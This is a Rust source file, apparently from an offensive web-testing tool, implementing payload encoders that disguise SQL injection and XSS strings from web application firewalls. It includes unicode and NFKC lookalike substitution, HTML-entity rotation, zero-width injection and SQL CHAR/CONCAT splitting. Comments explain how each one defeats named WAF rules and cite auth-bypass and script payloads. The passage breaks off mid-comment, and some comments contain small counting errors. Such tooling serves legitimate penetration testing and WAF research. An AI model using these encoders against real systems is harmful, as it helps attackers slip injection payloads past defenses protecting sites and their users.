//! Unicode and HTML entity encoding strategies.
use std::fmt::Write as _;

/// Unicode encoding — each character becomes `\uXXXX`.
///
/// **Context**: ONLY safe when the target parser performs JSON/JavaScript decoding.
/// Using this on raw HTTP parameters will send a literal backslash-u sequence.
#[must_use]
pub fn unicode_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let code = ch as u32;
        if code > 0xFFFF {
            // Non-BMP: emit surrogate pair (valid in JSON/JavaScript)
            let surrogate_base = code - 0x1_0000;
            let high = 0xD800 + ((surrogate_base >> 10) & 0x3FF);
            let low = 0xDC00 + (surrogate_base & 0x3FF);
            let _ = write!(&mut out, "\\u{high:04X}\\u{low:04X}");
        } else {
            let _ = write!(&mut out, "\\u{code:04X}");
        }
    }
    out
}

/// IIS/ASP percent Unicode encoding — each character becomes `%uXXXX`.
///
/// **Context**: ONLY safe on IIS/ASP classic parsers. IIS `%u` encoding
/// is bounded to BMP (U+0000–U+FFFF) — non-BMP code points must be
/// emitted as UTF-16 surrogate pairs (`%uD83D%uDE00` for 😀, NOT the
/// invalid `%u1F600`). Pre-fix the loop wrote `ch as u32` straight
/// into a 4-hex-wide format, silently truncating high bytes for any
/// supplementary plane char and producing output IIS rejects — which
/// looked encoded but bypassed nothing.
#[must_use]
pub fn iis_unicode_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let code = ch as u32;
        if code > 0xFFFF {
            let surrogate_base = code - 0x1_0000;
            let high = 0xD800 + ((surrogate_base >> 10) & 0x3FF);
            let low = 0xDC00 + (surrogate_base & 0x3FF);
            let _ = write!(&mut out, "%u{high:04X}%u{low:04X}");
        } else {
            let _ = write!(&mut out, "%u{code:04X}");
        }
    }
    out
}

/// JSON string-content escape — produces the escaped INTERIOR of a
/// JSON string literal (no surrounding `"..."` quotes).
///
/// Pre-fix this wrapped the output in double quotes. The wrapping
/// broke every common use case: the encoder is called by the
/// variant builder which substitutes the result into the operator's
/// payload at an injection point inside an EXISTING string field
/// (typical: `{"q": "<wrapped>"}`). Adding our own quotes produced
/// `{"q": ""actual\"escaped""}` — two strings concatenated, malformed
/// JSON, server returns 400. The escape characters survived but the
/// host JSON was broken.
///
/// Removing the wrapping quotes makes the encoder do what its name
/// says — escape the content. Callers that need a full standalone
/// JSON-string literal can prepend `"` themselves.
///
/// **Context**: Inject INSIDE an existing JSON string field. Backend
/// JSON parser unescapes the sequence; the WAF sees the escaped
/// form (e.g. `<` instead of `<`) and misses the keyword.
#[must_use]
pub fn json_string_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for ch in payload.chars() {
        match ch {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\u{0008}' => out.push_str("\\b"),
            '\u{000C}' => out.push_str("\\f"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                let _ = write!(&mut out, "\\u{:04X}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

/// HTML entity encoding — each character becomes `&#xXX;`.
///
/// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
#[must_use]
pub fn html_entity_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let _ = write!(&mut out, "&#x{:X};", ch as u32);
    }
    out
}

/// HTML decimal entity encoding — each character becomes `&#DD;`.
///
/// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
#[must_use]
pub fn html_entity_decimal_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for ch in payload.chars() {
        let _ = write!(&mut out, "&#{};", ch as u32);
    }
    out
}

/// HTML entity encoding with per-character variant rotation.
///
/// Cycles each character through four browser-tolerant forms that strict
/// WAF regexes (which typically anchor on `&#x[0-9a-f]+;` with a lowercase
/// `x` and required `;`) miss:
///
/// 1. `&#xHH;`     — canonical lowercase-x hex
/// 2. `&#XHH;`     — uppercase-X hex (browsers accept; case-sensitive regex misses)
/// 3. `&#DD;`      — decimal
/// 4. `&#000DD;`   — decimal with leading zeros (HTML5 spec allows arbitrary leading zeros)
///
/// Rotation is by character index (deterministic; same input always
/// produces the same output — important for proptest idempotency).
///
/// **Bypass mechanism**: a `ModSecurity` regex like
/// `@rx &#x([0-9a-f]+);.*&#x([0-9a-f]+);` won't match a payload of
/// `&#X3C;&#0060;&#x73;&#62;` (the same `<s` payload routed through all
/// four variants). The browser decodes all four; the regex anchored on
/// the canonical form sees a different shape.
///
/// **Context**: HTML body / attribute. Equivalent to `html_entity` /
/// `html_entity_decimal` for browser decoding; safer against
/// canonicalising WAFs that strip the trailing `;` only on the lowercase
/// form.
#[must_use]
pub fn html_entity_variants(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 8);
    for (idx, ch) in payload.chars().enumerate() {
        let code = ch as u32;
        match idx % 4 {
            0 => {
                let _ = write!(&mut out, "&#x{code:x};");
            }
            1 => {
                let _ = write!(&mut out, "&#X{code:X};");
            }
            2 => {
                let _ = write!(&mut out, "&#{code};");
            }
            _ => {
                let _ = write!(&mut out, "&#000{code};");
            }
        }
    }
    out
}

/// Fullwidth Unicode encoding — replaces ASCII with fullwidth equivalents.
///
/// Maps `!`–`~` (0x21–0x7E) to the fullwidth range `！`–`～` (0xFF01–0xFF5E).
/// Spaces become ideographic space (U+3000).
///
/// **Bypass mechanism**: Many WAFs regex against ASCII keywords like `SELECT`,
/// `UNION`, `<script>`, etc. Fullwidth characters are visually identical but
/// have different codepoints, so regex fails. However, backends that perform
/// Unicode NFKC normalization will convert them back to ASCII — meaning the
/// payload executes while the WAF never saw it.
///
/// **Context**: Effective against WAFs in front of servers that normalize Unicode
/// (Java/Spring, .NET, Python 3, Go, `PostgreSQL`, etc.).
#[must_use]
pub fn fullwidth_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 3);
    for ch in payload.chars() {
        let mapped = match ch {
            ' ' => '\u{3000}', // Ideographic space
            c if ('\x21'..='\x7e').contains(&c) => {
                // Fullwidth offset: U+FF01 = U+0021 + 0xFEE0
                char::from_u32(c as u32 + 0xFEE0).unwrap_or(c)
            }
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Alphanumeric Symbols encoding — replaces ASCII letters and
/// digits with their Math-Bold counterparts in the Unicode `U+1D400` block.
///
/// `A`–`Z` → `U+1D400`–`U+1D419` (Math Bold Capitals: 𝐀 𝐁 … 𝐙)
/// `a`–`z` → `U+1D41A`–`U+1D433` (Math Bold Smalls:   𝐚 𝐛 … 𝐳)
/// `0`–`9` → `U+1D7CE`–`U+1D7D7` (Math Bold Digits:   𝟎 𝟏 … 𝟗)
/// Everything else is passed through unchanged (punctuation, spaces, etc.,
/// keep working as SQL/HTML syntax).
///
/// **Bypass mechanism**: every codepoint in this range NFKC-normalises back
/// to its plain-ASCII counterpart. Databases / frameworks that perform NFKC
/// normalisation (`PostgreSQL` with ICU collations, `MySQL`
/// `utf8mb4_0900_ai_ci`, Java `Normalizer.normalize(s, NFKC)`, Python
/// `unicodedata.normalize('NFKC', s)`, Go `golang.org/x/text/unicode/norm`)
/// see the original `SELECT` / `UNION` / `script` keyword and execute /
/// render it. WAFs scanning bytes for ASCII keywords see codepoints in the
/// `U+1D400` block — no keyword match.
///
/// **Distinct from `fullwidth_encode`**: fullwidth uses the `U+FF00`
/// Halfwidth-and-Fullwidth-Forms block. Math Alphanumeric uses the
/// `U+1D400` block — different code range, different WAF coverage gap.
/// WAFs that block fullwidth (a common technique since 2020) often do not
/// also block Math Alphanumeric Symbols. Both encode-paths NFKC to ASCII.
///
/// **Context**: any target whose backend NFKC-normalises before parsing.
/// Confirmed targets: `PostgreSQL` ICU + `MySQL` `utf8mb4_0900_ai_ci`
/// SQL identifiers, Java/Spring Boot path matching, .NET `String.Normalize`.
#[must_use]
pub fn math_bold_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'A'..='Z' => char::from_u32(0x1D400 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x1D41A + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            '0'..='9' => char::from_u32(0x1D7CE + (ch as u32 - '0' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Italic alphabet — same NFKC trick as `math_bold_encode`
/// but in a different Unicode block (U+1D434 uppercase, U+1D44E
/// lowercase). WAFs that have added detection for the bold range
/// (U+1D400-) do not always cover italic.
///
/// One subtle gap: the math-italic block has a HOLE at U+1D455 where
/// 'h' would have been (the letter 'h' was unified with U+210E PLANCK
/// CONSTANT in an earlier Unicode revision). We substitute U+210E so
/// the round-trip stays NFKC-correct.
///
/// Reference: https://ibrahimsql.com/posts/waf-bypass-unicode
#[must_use]
pub fn math_italic_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'A'..='Z' => char::from_u32(0x1D434 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'h' => '\u{210E}', // hole at U+1D455; use PLANCK CONSTANT
            'a'..='z' => char::from_u32(0x1D44E + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Script alphabet — uppercase U+1D49C, lowercase U+1D4B6.
/// Script has SIX holes (U+1D49D B, U+1D4A0 E, U+1D4A1 F, U+1D4A3 H,
/// U+1D4A4 I, U+1D4A7 M, U+1D4AD R, U+1D4BA e, U+1D4BC g, U+1D4C4 o)
/// — each filled by the letterlike-symbols block (U+212C BCRIPT
/// CAPITAL B, U+2130 SCRIPT CAPITAL E, etc.) so the encoded string
/// stays NFKC-equivalent to ASCII.
#[must_use]
pub fn math_script_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'B' => '\u{212C}',
            'E' => '\u{2130}',
            'F' => '\u{2131}',
            'H' => '\u{210B}',
            'I' => '\u{2110}',
            'L' => '\u{2112}',
            'M' => '\u{2133}',
            'R' => '\u{211B}',
            'A'..='Z' => char::from_u32(0x1D49C + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'e' => '\u{212F}',
            'g' => '\u{210A}',
            'o' => '\u{2134}',
            'a'..='z' => char::from_u32(0x1D4B6 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Fraktur (blackletter) alphabet — uppercase U+1D504,
/// lowercase U+1D51E. Fraktur has holes at C/H/I/R/Z which are filled
/// by U+212D ℭ, U+210C ℌ, U+2111 ℑ, U+211C ℜ, U+2128 ℨ.
#[must_use]
pub fn math_fraktur_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'C' => '\u{212D}',
            'H' => '\u{210C}',
            'I' => '\u{2111}',
            'R' => '\u{211C}',
            'Z' => '\u{2128}',
            'A'..='Z' => char::from_u32(0x1D504 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x1D51E + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Mathematical Double-Struck (blackboard bold) alphabet — uppercase
/// U+1D538, lowercase U+1D552. Holes at C/H/N/P/Q/R/Z filled from
/// the letterlike-symbols block.
#[must_use]
pub fn math_double_struck_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            'C' => '\u{2102}',
            'H' => '\u{210D}',
            'N' => '\u{2115}',
            'P' => '\u{2119}',
            'Q' => '\u{211A}',
            'R' => '\u{211D}',
            'Z' => '\u{2124}',
            'A'..='Z' => char::from_u32(0x1D538 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x1D552 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            // Double-struck digits (U+1D7D8).
            '0'..='9' => char::from_u32(0x1D7D8 + (ch as u32 - '0' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Letterlike-symbols + circled-Latin selective substitution — replaces
/// individual ASCII letters in the payload with codepoints from
/// U+2100-214F and U+24B6-24E9 that NFKC-normalize back to the original
/// ASCII letter. Unlike the math-*-encode functions which substitute
/// every letter from a single block, this picks the most visually-
/// distinct codepoint per letter to maximise WAF-rule mismatch while
/// keeping the encoded string visibly identifiable.
///
/// The HackerNoon-documented `ŚεℒℇℂƮ` payload is essentially this
/// function applied to the SQL keyword `SELECT` — backend's NFKC casts
/// it to `SELECT` and executes; the WAF's signature regex sees an
/// unrecognized codepoint sequence.
#[must_use]
pub fn letterlike_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            // Letterlike-symbols block (U+2100-214F).
            'B' => '\u{212C}', // SCRIPT CAPITAL B → B
            'C' => '\u{2102}', // DOUBLE-STRUCK CAPITAL C → C
            'E' => '\u{2130}', // SCRIPT CAPITAL E → E
            'F' => '\u{2131}', // SCRIPT CAPITAL F → F
            'H' => '\u{210B}', // SCRIPT CAPITAL H → H
            'I' => '\u{2110}', // SCRIPT CAPITAL I → I
            'L' => '\u{2112}', // SCRIPT CAPITAL L → L
            'M' => '\u{2133}', // SCRIPT CAPITAL M → M
            'N' => '\u{2115}', // DOUBLE-STRUCK CAPITAL N → N
            'P' => '\u{2119}', // DOUBLE-STRUCK CAPITAL P → P
            'Q' => '\u{211A}', // DOUBLE-STRUCK CAPITAL Q → Q
            'R' => '\u{211D}', // DOUBLE-STRUCK CAPITAL R → R
            'Z' => '\u{2124}', // DOUBLE-STRUCK CAPITAL Z → Z
            // Kelvin K (U+212A) and Angstrom Å (U+212B) NFKC-normalise.
            'K' => '\u{212A}',
            'e' => '\u{212F}', // SCRIPT SMALL E
            'g' => '\u{210A}', // SCRIPT SMALL G
            'o' => '\u{2134}', // SCRIPT SMALL O
            // Falling back to circled-Latin for letters without
            // letterlike-symbol equivalents. NFKC strips the circle
            // and yields the bare letter.
            'A'..='Z' => char::from_u32(0x24B6 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
            'a'..='z' => char::from_u32(0x24D0 + (ch as u32 - 'a' as u32)).unwrap_or(ch),
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// SQL string-literal CONCAT splitter — converts every single-quoted string
/// in the payload to a `CONCAT('a','b',...)` expression with one char per
/// argument.
///
/// Input  `'admin'`  → output  `CONCAT('a','d','m','i','n')`
///
/// **Bypass mechanism**: CRS rules and most commercial WAF blocklists
/// scan for literal danger-string substrings — `'admin'`, `'password'`,
/// `'union'`, `'or 1'`, `'/etc/passwd'`. CONCAT-splitting decomposes the
/// substring into one-character literals that no individual literal-string
/// regex matches. The DB evaluates `CONCAT(...)` to the original string at
/// runtime, so the attack succeeds.
///
/// Supported by MySQL, MariaDB, PostgreSQL, MSSQL (all ship CONCAT as a
/// scalar function). Oracle uses `CONCAT(a,b)` as binary-only, so chained
/// 1-char Oracle calls would need a nested form — out of scope here; the
/// `||` pipe concat in PostgreSQL/Oracle is a separate tamper.
///
/// **Edge cases**:
/// - Empty string literals (`''`) become `CONCAT('')` — valid SQL,
///   evaluates to empty string.
/// - Escaped quotes inside strings (`'O\'Brien'`) are passed through as
///   raw chars to CONCAT — the backslash and quote are split into separate
///   args.
/// - Strings not in single quotes are left alone (no aggressive parsing
///   of double-quoted SQL Server identifiers).
///
/// **Context**: SQL injection payloads with string literals.
#[must_use]
pub fn sql_concat_split(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        // Found opening quote — collect chars until closing quote.
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            // Unbalanced quote — emit original opener + collected chars.
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        // Emit CONCAT('a','b',...).  Empty literal → CONCAT('').
        out.push_str("CONCAT(");
        if literal.is_empty() {
            out.push_str("''");
        } else {
            // Direct write loop instead of collect+join — saves N+1
            // heap String allocations per literal. Per perf-hunt F03.
            let mut first = true;
            for c in literal.chars() {
                if !first {
                    out.push(',');
                }
                first = false;
                if c == '\'' {
                    out.push_str("''''");
                } else {
                    out.push('\'');
                    out.push(c);
                    out.push('\'');
                }
            }
        }
        out.push(')');
    }
    out
}

/// SQL CHAR()-function decomposition — converts every single-quoted string
/// literal in the payload to a `CHAR(N1,N2,...)` function call with one
/// codepoint per argument.
///
/// Input  `'admin'`  → output  `CHAR(97,100,109,105,110)`
///
/// **Bypass mechanism**: distinct from `sql_concat_split` (which produces
/// `CONCAT('a','d',...)`) — CHAR() takes integer codepoints, not single-
/// char strings, so the payload contains NO single-quoted ASCII tokens at
/// all. WAF rules that match string-literal patterns (`'admin'`,
/// `'password'`, `'/etc/passwd'`, `'or 1'`) and CONCAT-shaped patterns
/// (`CONCAT\(.{,8}\)`) both miss this form. Most CRS rules through PL3 do
/// NOT pattern-match raw CHAR() — it's been the sqlmap default for over a
/// decade and has been deemed too noisy to block.
///
/// Supported by MySQL, MariaDB (native `CHAR()`), MSSQL (`CHAR()`). For
/// Postgres / Oracle, the equivalent is `CHR()` — out of scope here; a
/// sibling `chr_decompose` could ship later.
///
/// **Edge cases**:
/// - Empty literals (`''`) pass through as `''` unchanged. `CHAR()`
///   with zero args evaluates to NULL in MySQL — silently flipping
///   a comparison like `pass='' OR 1=1` into `pass=NULL OR 1=1`
///   would break the auth bypass (`= NULL` is never TRUE). Preserve
///   the empty-string identity.
/// - Multi-byte UTF-8 chars produce a single `CHAR(codepoint)` per
///   `chars()` iteration — for codepoints > 255, MySQL's CHAR() returns
///   per-byte; the codepoint may not round-trip exactly. Most SQLi
///   payloads use ASCII literals — this matters only for adversarial
///   inputs.
/// - Unbalanced opening quote: emitted unchanged.
///
/// **Context**: SQL injection with string-literal targets that are
/// blocklisted (`admin`, `password`, paths, hostnames).
#[must_use]
pub fn sql_char_decompose(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 5);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        // Empty literal: pass through as-is. CHAR() with zero
        // arguments evaluates to NULL in MySQL, not the empty
        // string. Auth-bypass payloads using `''` (e.g.
        // `pass='' OR 1=1`) would silently flip the comparison
        // to NULL — `WHERE pass=NULL` is never TRUE, so the
        // bypass fails. Preserve the empty-string identity.
        if literal.is_empty() {
            out.push_str("''");
            continue;
        }
        out.push_str("CHAR(");
        // Direct write loop — per perf-hunt F03.
        let mut first = true;
        for c in literal.chars() {
            if !first {
                out.push(',');
            }
            first = false;
            let _ = write!(&mut out, "{}", c as u32);
        }
        out.push(')');
    }
    out
}

/// Postgres / Oracle CHR()-function decomposition — `CHR(N) || CHR(N) || ...`
/// per char of every single-quoted string literal.
///
/// Input  `'admin'`  →  output  `(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))`
///
/// Differs from `sql_char_decompose` (which uses MySQL's variadic
/// `CHAR(N1,N2,...)`) — Postgres / Oracle `CHR()` is unary, so codepoints
/// are concatenated via the SQL standard `||` pipe operator. The wrapping
/// parens preserve precedence inside larger expressions (`WHERE u = ...`).
///
/// Postgres-specific: codepoints up to U+10FFFF are valid; Oracle CHR(N)
/// treats N modulo `NLS_CHARACTERSET` size (often 256-modular for
/// `WE8MSWIN1252`). For ASCII payloads (the common case) both behave
/// identically.
///
/// Empty literal → `('')`. Unbalanced quote → passed through.
#[must_use]
pub fn pg_chr_decompose(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 7);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        if literal.is_empty() {
            out.push_str("('')");
            continue;
        }
        // Direct write loop — per perf-hunt F03.
        out.push('(');
        let mut first = true;
        for c in literal.chars() {
            if !first {
                out.push_str("||");
            }
            first = false;
            let _ = write!(&mut out, "CHR({})", c as u32);
        }
        out.push(')');
    }
    out
}

/// Partial JSON Unicode escape — encodes ASCII alphanumeric chars as
/// `\uXXXX` while leaving structural punctuation (quotes, operators,
/// whitespace) bare.
///
/// **Bypass mechanism**: Keyword fingerprint rules (UNION, SELECT, alert,
/// script, eval, …) match against the byte sequence. Splitting the
/// keyword across Unicode escapes defeats them — the origin's JSON
/// parser / JS engine re-materializes the keyword at the application
/// layer, but the WAF sees `UNION` in the wire
/// bytes and finds no `UNION`. Distinct from [`unicode_encode`] which
/// escapes EVERY char (high `\u` density flags some heuristic WAFs);
/// this leaves the SQL/HTML/JS structural skeleton visible, so the
/// payload still looks like data.
///
/// **Idempotent**: pre-existing `\uXXXX` sequences in the input are
/// detected and passed through verbatim — second-pass tampering does
/// not re-escape an already-escaped char.
///
/// **Context**: ONLY safe when the target parser performs
/// JSON-style / JavaScript-style Unicode decoding. Inert against raw
/// HTTP parameters (you'll send literal backslash-u bytes).
#[must_use]
pub fn json_unicode_alnum(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    let chars: Vec<char> = payload.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '\\'
            && i + 5 < chars.len()
            && chars[i + 1] == 'u'
            && chars[i + 2..i + 6].iter().all(|h| h.is_ascii_hexdigit())
        {
            for k in 0..6 {
                out.push(chars[i + k]);
            }
            i += 6;
            continue;
        }
        if c.is_ascii_alphanumeric() {
            let _ = write!(&mut out, "\\u{:04X}", c as u32);
        } else {
            out.push(c);
        }
        i += 1;
    }
    out
}

/// SQL adjacent-string-literal concatenation — every `'string'` literal of
/// length ≥ 2 is rewritten as a sequence of single-character adjacent
/// literals: `'admin'` → `'a' 'd' 'm' 'i' 'n'`.
///
/// **Bypass mechanism**: SQL standard (ANSI SQL-92 §5.3) specifies that
/// two adjacent character-string literals separated only by whitespace
/// are concatenated by the parser. MySQL, Postgres, SQLite, Oracle, DB2
/// all implement this. WAF rules that match the literal substring of
/// well-known credentials or paths (e.g. `'admin'`, `'/etc/passwd'`)
/// see N unrelated single-character strings instead of one token. The
/// database rejoins them at parse time — no comments, no CONCAT calls,
/// no special functions. Pure SQL semantics.
///
/// **Idempotent**: every output sub-literal has length 1, below the
/// split threshold — a second pass leaves the output unchanged.
///
/// **Context**: Effective against any byte-pattern WAF inspecting
/// SQL bodies. Inert outside SQL context (won't fire on non-quoted
/// payloads).
#[must_use]
pub fn sql_adjacent_string_concat(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() + 8);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '\'' {
            out.push(ch);
            continue;
        }
        let mut literal = String::new();
        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                if chars.peek() == Some(&'\'') {
                    literal.push('\'');
                    chars.next();
                    continue;
                }
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        let lit_chars: Vec<char> = literal.chars().collect();
        if lit_chars.len() < 2 {
            // Length-0 or length-1 literal: pass through. Note for
            // length-1 with `'`: that's a literal containing a single
            // `'`, which we encode as `''''` (four-quote form) to keep
            // the output SQL-valid.
            out.push('\'');
            if lit_chars.len() == 1 && lit_chars[0] == '\'' {
                out.push_str("''");
            } else {
                out.push_str(&literal);
            }
            out.push('\'');
            continue;
        }
        // Single-character split: each char of the literal becomes its
        // own `'c'` quoted token, joined by single spaces. ANSI SQL-92
        // §5.3 concatenates them at parse time. Idempotent: each output
        // sub-literal has length 1 (below the threshold) so a second
        // pass sees only short literals and produces identical output.
        //
        // Escaped-quote handling: if the source literal contained a
        // SQL `''` escape it lives in `literal` as a single `'` char.
        // The shattered single-char literal for that position emits
        // `''''` (four-quote form: opening quote, escaped quote, escaped
        // quote, closing quote) so the database reassembles the
        // original `'` content. Idempotency holds because `''''` parses
        // as a length-1 literal containing `'` on the next pass.
        let mut first = true;
        for c in lit_chars {
            if !first {
                out.push(' ');
            }
            first = false;
            out.push('\'');
            if c == '\'' {
                out.push_str("''");
            } else {
                out.push(c);
            }
            out.push('\'');
        }
    }
    out
}

/// Homoglyph substitution — replaces select ASCII characters with visually
/// identical Unicode characters from other scripts.
///
/// **Bypass mechanism**: WAFs match `'`, `"`, `<`, `>`, `=`, etc. as literal
/// bytes. Unicode homoglyphs look identical in logs but aren't matched by
/// byte-level regex. If the backend performs Unicode normalization (NFKC) or
/// accepts these codepoints in SQL/HTML contexts, the payload executes.
///
/// **Context**: Effective against byte-level WAFs. Requires backend Unicode
/// tolerance (common in modern frameworks).
#[must_use]
pub fn homoglyph_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            // INTENTIONALLY NOT REPLACED — SQL string delimiters.
            // Pre-fix `'` → U+2019 and `"` → U+201D were mapped to
            // their right-single/double quotation marks. Those
            // codepoints are NOT recognised as string delimiters
            // by ANY SQL parser — they're treated as word
            // characters. The host query's string literal is never
            // closed, the injection context-break disappears, and
            // the payload becomes inert. Modern frameworks rarely
            // NFKC-normalise BEFORE the SQL parser sees the bytes,
            // so the assumption that this trick survives was wrong
            // in practice. Keep `'` and `"` ASCII; mutate only the
            // non-delimiter punctuation below.
            //
            // Comparison operators
            '<' => '\u{FF1C}', // FULLWIDTH LESS-THAN SIGN (＜)
            '>' => '\u{FF1E}', // FULLWIDTH GREATER-THAN SIGN (＞)
            '=' => '\u{FF1D}', // FULLWIDTH EQUALS SIGN (＝)
            // Punctuation
            '(' => '\u{FF08}', // FULLWIDTH LEFT PARENTHESIS (（)
            ')' => '\u{FF09}', // FULLWIDTH RIGHT PARENTHESIS (）)
            ';' => '\u{FF1B}', // FULLWIDTH SEMICOLON (；)
            '-' => '\u{2010}', // HYPHEN (‐)
            '/' => '\u{2215}', // DIVISION SLASH (∕)
            // Keep letters, digits, and delimiters unchanged.
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Inject zero-width / format characters between letters of `payload`.
///
/// `chars` selects which invisible char to insert; `positions` controls
/// where (every-other / per-keyword-letter / FNV-seeded). The output
/// is byte-distinct from the input but visually identical AND, for
/// `chars = ZERO_WIDTH_DEFAULTS`, semantically equivalent to most HTML
/// and SQL parsers (which strip U+200B–200D / U+FEFF on parse).
///
/// Sucuri-documented XSS bypass `&lt;scr​ipt&gt;alert(1)&lt;/scr​ipt&gt;`
/// uses U+200B between `scr` and `ipt`; the WAF regex `/script/i`
/// misses; the browser's HTML parser drops the ZWSP and renders.
///
/// Use [`ZERO_WIDTH_DEFAULTS`] for the recommended cycle of
/// [U+200B, U+200C, U+200D, U+FEFF, U+034F] — rotating across these
/// per-position defeats WAFs that have hardcoded a single zero-width
/// stripper.
#[must_use]
pub fn zero_width_inject(payload: &str, invisible_char: char) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        out.push(ch);
        // Inject after every alphanumeric except the last char of the
        // string (so trailing context is preserved).
        if ch.is_ascii_alphanumeric() && chars.peek().is_some() {
            out.push(invisible_char);
        }
    }
    out
}

/// Recommended cycle of invisible characters for zero-width injection.
/// `[U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF BOM, U+034F CGJ]`.
pub const ZERO_WIDTH_DEFAULTS: [char; 5] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}', '\u{034F}'];

/// Inject a combining diacritical mark after each letter of `payload`.
///
/// `s̈elect` (s + U+0308 COMBINING DIAERESIS + elect) reads as `select`
/// after NFC normalisation (Python `unicodedata.normalize('NFC', x)`,
/// Java `Normalizer.normalize(s, NFC)`) but the WAF regex `/select/`
/// sees a different byte sequence and misses.
///
/// Common safe marks (no NFC reflow, just stripped by char-walk
/// readers): U+0300 grave, U+0301 acute, U+0308 diaeresis, U+0327
/// cedilla. U+034F COMBINING GRAPHEME JOINER is the most invisible
/// (zero width, no visual diacritic), so it's the default.
#[must_use]
pub fn combining_mark_inject(payload: &str, mark: char) -> String {
    let mut out = String::with_capacity(payload.len() * 3);
    for ch in payload.chars() {
        out.push(ch);
        if ch.is_ascii_alphabetic() {
            out.push(mark);
        }
    }
    out
}

/// Cross-script Cyrillic / Greek letter substitution.
///
/// Unlike [`homoglyph_encode`] (punctuation-only by design),
/// `script_homoglyph_encode` substitutes the *letters* themselves
/// with visually-identical codepoints from Cyrillic + Greek scripts
/// that the WAF regex sees as different bytes. Two sub-classes:
///
/// 1. **Non-normalising** (Cyrillic ѕ U+0455, е U+0435, о U+043E,
///    а U+0430; Greek ο U+03BF, ν U+03BD, …) — backend and WAF both
///    see different codepoints, but MSSQL's implicit Unicode→varchar
///    coercion maps Cyrillic lookalikes to ASCII via collation
